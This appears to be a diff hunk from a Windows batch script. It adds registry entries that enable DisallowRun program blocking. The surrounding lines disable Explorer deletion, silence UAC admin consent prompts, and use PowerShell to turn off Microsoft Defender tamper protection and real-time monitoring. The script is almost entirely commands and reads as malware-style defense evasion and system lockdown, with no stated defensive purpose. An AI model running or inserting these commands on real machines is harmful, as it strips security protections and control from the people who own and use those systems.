@@ -47,6 +47,8 @@ REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v Disabl
 REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDelete /t REG_DWORD /d 1 /f
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 1 /f
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /t REG_DWORD /d 1 /f
+REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /t REG_SZ /d "Temp" /f
 
 powershell -command "Set-MpPreference -DisableTamperProtection $true"
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
